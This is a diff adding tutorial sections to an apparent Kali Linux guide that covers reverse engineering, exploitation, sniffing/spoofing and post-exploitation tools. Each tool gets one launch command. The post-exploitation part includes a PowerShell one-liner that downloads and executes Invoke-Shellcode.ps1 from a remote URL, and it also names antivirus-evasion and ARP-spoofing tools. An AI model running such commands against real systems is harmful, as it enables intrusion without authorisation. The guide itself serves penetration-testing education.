@@ -301,3 +301,196 @@ Command Example:
 kismet
 ```
 This command launches the Kismet GUI, allowing users to perform wireless network discovery and monitoring.
+
+# Comprehensive Guide to Reverse Engineering with Kali Linux
+
+## Introduction
+Reverse engineering involves the process of analyzing a system or software to understand its design, architecture, and functionality, often with the aim of replicating or modifying it. Kali Linux, a popular distribution for penetration testing and digital forensics, provides a comprehensive set of tools for reverse engineering tasks.
+[Tutorial for Reverse Engineering](https://youtu.be/gh2RXE9BIN8?si=mZWqYIRHqoL-TyFl)
+
+In this guide, we'll explore the tools and methodologies available in Kali Linux for conducting Reverse Engineering.
+
+## Tools and Techniques
+
+### 1. Radare2
+[Radare2](https://rada.re/n/radare2.html) is a powerful and versatile open-source reverse engineering toolkit. It can be used to analyze, disassemble, and debug a wide range of executable formats, including native applications, firmware, and even proprietary file formats.
+
+#### Command Example:
+```bash
+r2 /path/to/binary
+```
+This command is typically used to execute a binary file within the Radare2 framework.
+
+2. GDB (GNU Debugger)
+GDB is a powerful debugging tool for C (along with other languages like C++). It helps you to poke around inside your C programs while they are executing and also allows you to see what exactly happens when your program crashes.
+
+Command Example:
+```bash
+gdb /path/to/binary
+```
+This command  it instructs GDB to load the specified binary executable file and provide you with a debugging environment where you can interactively analyze and debug the program. 
+
+3. Binutils
+Binutils  is a collection of binary tools that can be used for various reverse engineering tasks.
+
+Command Example:
+```bash
+objdump -x /path/to/binary
+```
+This command is used to display information about the specified binary file. 
+
+4. Dynamic Analysis
+Dynamic Analysis is a software testing technique that involves examining the behavior of a program while it is running.
+
+Command Example:
+```bash
+strace ./program
+```
+This command is used to trace the system calls made by a program during its execution.
+
+# Comprehensive Guide to Exploitation Tools with Kali Linux
+
+## Introduction
+Exploitation tools are used in cybersecurity to identify and exploit vulnerabilities in software, systems, or networks. Kali Linux, a popular distribution for penetration testing and digital forensics, provides a wide array of exploitation tools to assess the security posture of target systems.
+[Tutorial for Exploitation Tools](https://youtu.be/mzI59CIS1eE?si=ohnjMYWC0R8Exnxj)
+
+In this guide, we'll explore the tools and methodologies available in Kali Linux for conducting Exploitation Tools.
+
+## Tools and Techniques
+
+### 1. Metasploit Framework
+[Metasploit Framework](https://github.com/rapid7/metasploit-framework) is a powerful tool for penetration testing and exploit development. It includes a vast collection of exploits, payloads, and auxiliary modules.
+
+#### Command Example:
+```bash
+msfconsole
+```
+This command used to start the Metasploit Framework console. It provides a command-line interface (CLI) where users can interact with various modules, exploit payloads, and auxiliary tools offered by the Metasploit Framework.
+
+2. SQLMap
+SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+
+Command Example:
+```bash
+sqlmap -u <URL> --dump
+```
+This command  is used for automated SQL injection testing and exploitation. 
+
+3. ExploitDB
+ExploitDB is a very useful resource for identifying possible weaknesses in your network and for staying up to date on current attacks occurring in other networks.
+
+Command Example:
+```bash
+searchsploit <keyword>
+```
+This command searches the Exploit Database for exploits, shellcodes, papers, and other relevant information related to the specified keyword. 
+
+4. Nikto
+Nikto is an Open Source software written in Perl language that is used to scan a web-server for the vulnerability that can be exploited and can compromise the server.
+
+Command Example:
+```bash
+nikto -h <hostname>
+```
+This command is used for web server vulnerability scanning and assessment.
+
+# Comprehensive Guide to Sniffing & Spoofing with Kali Linux
+
+## Introduction
+Sniffing and spoofing are techniques used in cybersecurity to intercept and manipulate network traffic for various purposes, including reconnaissance, information gathering, and attacks. Kali Linux, a popular distribution for penetration testing and digital forensics, provides a wide range of tools for sniffing and spoofing network traffic.
+[Tutorial for Sniffing & Spoofing](https://youtu.be/Qh9BxoCB_Dc?si=x3XOOHOIDCWALBS5)
+
+In this guide, we'll explore the tools and methodologies available in Kali Linux for conducting Sniffing & Spoofing.
+
+## Tools and Techniques
+
+### 1. Wireshark
+[Wireshark](https://www.lifewire.com/wireshark-tutorial-4143298)  is a popular network protocol analyzer that allows users to capture and interactively browse the traffic running on a computer network.
+
+#### Command Example:
+```bash
+sudo wireshark
+```
+This command launching Wireshark with elevated privileges, which may be necessary to capture network traffic on some systems where permissions are restricted. 
+
+2. Ettercap
+Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.
+
+Command Example:
+```bash
+sudo ettercap -G
+```
+This command  is used to launch Ettercap with its graphical user interface (GUI).  
+
+3. Dsniff
+Dsniff is a collection of network traffic analysis tools that allow you to listen to and manipulate network traffic. These tools are particularly useful for security researchers, network administrators, and penetration testers.
+
+Command Example:
+```bash
+sudo dsniff -i <interface>
+```
+This command is used for network sniffing and password sniffing on a local network.
+
+4. Tcpdump
+Tcpdump is a powerful network packet analyzer available in Kali Linux, a popular penetration testing and security assessment distribution.
+
+Command Example:
+```bash
+sudo tcpdump -i <interface>
+```
+This command is starts capturing network packets on the specified interface and displays information about them in real-time. This can include details such as source and destination IP addresses, port numbers, protocols, packet content, and more.
+
+5.  Arpspoof
+ Arpspoof is a tool for sniffing packets on a local area network by forging ARP replies.
+
+Command Example:
+```bash
+sudo arpspoof -i <interface> -t <target IP> <gateway IP>
+```
+This command is used for ARP spoofing, a type of attack where an attacker sends falsified ARP (Address Resolution Protocol) messages over a local area network.
+
+# Comprehensive Guide to Post Exploitation with Kali Linux
+
+## Introduction
+Post-exploitation refers to the phase of a cybersecurity attack where an attacker maintains access to a compromised system and gathers further information, escalates privileges, or performs other malicious activities. Kali Linux, a popular distribution for penetration testing and digital forensics, offers a variety of tools for conducting post-exploitation activities.
+[Tutorial for Post-exploitation](https://youtu.be/96k1eqc55jc?si=vwtOw1_NGBNfqJHQ)
+
+In this guide, we'll explore the tools and methodologies available in Kali Linux for conducting Post-exploitation.
+
+## Tools and Techniques
+
+### 1. Metasploit Framework
+[Metasploit Framework](https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/) is a powerful penetration testing tool that plays a crucial role in the toolkit of cybersecurity professionals.
+
+#### Command Example:
+```bash
+exploit/multi/handler
+```
+This command is use to set up a payload handler for handling connections from exploited systems.
+
+2. Empire
+Empire is a powerful post-exploitation framework that provides tools for maintaining control over compromised systems. It is designed to be used after an initial compromise to perform various tasks, such as lateral movement, privilege escalation, and data exfiltration. 
+
+Command Example:
+```bash
+sudo empire
+```
+This command launches the Empire framework with superuser privileges. This might be necessary depending on the specific actions you plan to perform within the framework, such as accessing certain system resources or performing privileged operations.
+
+3. PowerSploit
+PowerSploit is a collection of Microsoft PowerShell scripts designed for post-exploitation scenarios during authorized penetration tests. It provides a set of tools that can be used by security professionals to assess and secure systems.
+
+Command Example:
+```bash
+powershell -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')"
+```
+This command is a PowerShell one-liner used to download and execute a PowerShell script from a remote location.
+
+4. Veil-Evasion
+Veil-Evasion is a tool for generating payload executables that bypass antivirus detection.
+
+Command Example:
+```bash
+sudo veil-evasion
+```
+This command is  is used to launch Veil-Evasion with superuser privileges. Veil-Evasion is a popular post-exploitation framework that specializes in generating payloads to bypass antivirus software and intrusion detection systems (IDS).
